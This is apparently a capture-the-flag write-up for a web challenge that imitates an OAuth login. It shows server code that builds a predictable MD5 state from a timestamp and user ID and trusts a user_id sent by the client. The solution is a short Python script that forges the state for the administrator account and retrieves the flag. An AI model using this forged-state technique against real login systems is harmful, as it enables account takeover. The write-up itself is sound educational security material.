# The State of Trust

| | |
|---|---|
| **Section** | wave 8 |
| **Category** | web |
| **Solves** | 62 |

## Overview

The Bureau of Trust implements an OAuth-style login. A development copy of the state handler is exposed at `/source.py.bak`, and the callback trusts a client-supplied `user_id`. The relevant implementation is:

```python
def make_state(user_id: int) -> str:
    return hashlib.md5(f"{int(time.time())}:{user_id}".encode()).hexdigest()

def verify_state_for(user_id: int, submitted_state: str,
                     skew_seconds: int = 300) -> bool:
    now = int(time.time())
    for offset in range(-skew_seconds, skew_seconds + 1):
        expected = hashlib.md5(
            f"{now + offset}:{user_id}".encode()
        ).hexdigest()
        if submitted_state == expected:
            return True
    return False
```

The state is therefore predictable, and `verify_state_for` is the only callback check. There is no server-side binding between the state and the browser session.

## Solve

The lobby only links to guest, auditor, and treasurer, but the callback accepts any `user_id`. The administrator account is `user_id=1`. After exchanging the team token for a session, generate the state for the current timestamp and for user 1, then hit the callback directly:

```python
import hashlib, time, requests

s = requests.Session()
# First exchange the team token at /session/exchange, as the sign-in page does.
state = hashlib.md5(f"{int(time.time())}:1".encode()).hexdigest()
s.get("https://state-of-trust.pointeroverflowctf.com/auth/callback"
      f"?user_id=1&state={state}")
print(s.get("https://state-of-trust.pointeroverflowctf.com/flag").text)
```

The callback stores `sot_user_id=1`, so the session is now the administrator. The `/admin` dashboard exposes the Trust Seal button, which calls `/flag` and returns the flag. The accepted flag was `████████████████`.